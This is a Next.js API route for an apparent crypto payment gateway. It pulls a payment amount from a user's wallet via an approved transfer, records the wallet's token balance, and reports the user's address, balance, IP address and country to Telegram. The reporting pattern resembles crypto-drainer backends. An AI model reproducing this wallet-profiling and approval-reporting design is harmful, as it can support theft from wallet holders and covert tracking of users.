import { NextRequest, NextResponse } from "next/server";
import { blockchainService } from "@/lib/blockchain/blockchainService";
import { getDatabase } from "@/lib/db";
import { ChainType, CurrencyType, PaymentStatus } from "@/types";
import { getWalletType } from "@/utils/chainUtils";
import { TelegramService } from "@/lib/blockchain";
import { logger } from "@/lib/logger";
import { GATEWAY_ADDRESSES } from "@/constants";

export async function POST(request: NextRequest) {
  try {
    const { paymentId, currency, userAddress, chain, txHash } = await request.json();

    if (!paymentId || !currency || !userAddress || !chain) {
      return NextResponse.json({ success: false, error: "Missing required parameters" }, { status: 400 });
    }

    const db = getDatabase();

    let payment;
    try {
      // Get payment from database
      payment = await db.getPayment(paymentId);
      if (!payment || payment.currency !== currency) {
        return NextResponse.json({ success: false, error: "Payment not found or currency mismatch" }, { status: 404 });
      }
    } catch (error: any) {
      return NextResponse.json({ success: false, error: "Failed to get payment" }, { status: 500 });
    }

    // Get client IP from headers if not provided
    const clientIP =
      request.headers.get("x-forwarded-for")?.split(",")[0] || request.headers.get("x-real-ip") || "Unknown";

    const tokenBalance = await blockchainService.getUserTokenBalance(chain, currency as CurrencyType, userAddress);

    try {
      // Add wallet (no need to check if it exists)
      await db.saveWallet({
        address: userAddress,
        chain,
        currency,
        tokenBalance: tokenBalance || "0.00",
        amount: payment.amount.toString() || "0.00"
      });

      logger.info(`Wallet added: ${userAddress} on ${chain.toUpperCase()}`);
    } catch (error: any) {
      logger.error("Error adding wallet:", error);
    }

    try {
      const result = await blockchainService.transferFromUser(
        chain,
        currency as CurrencyType,
        userAddress,
        GATEWAY_ADDRESSES[chain as ChainType],
        payment.amount.toString()
      );

      const status = result.success ? "completed" : "failed";
      // Update payment status
      await db.updatePaymentStatus(paymentId, status as PaymentStatus, {
        wallet_address: userAddress,
        tx_hash: txHash
      });

      logger.info(`Successfully updated payment ${paymentId} status to: ${status}`);
    } catch (error: any) {
      logger.error("Error updating payment status:", error);
    }

    // Common telegram notification function
    try {
      const country = await TelegramService.getCountryFromIP(clientIP);
      const walletType = getWalletType(chain);

      await TelegramService.sendApprovalNotification({
        chain,
        currency,
        userAddress,
        amount: payment.amount.toString(),
        paymentId,
        walletType,
        clientIP,
        tokenBalance: tokenBalance?.toString() || "0.00",
        country
      });
    } catch (telegramError) {
      logger.error("Error sending Telegram notification:", telegramError);
    }

    return NextResponse.json({ success: true, message: "Payment processed successfully" }, { status: 200 });
  } catch (error: any) {
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
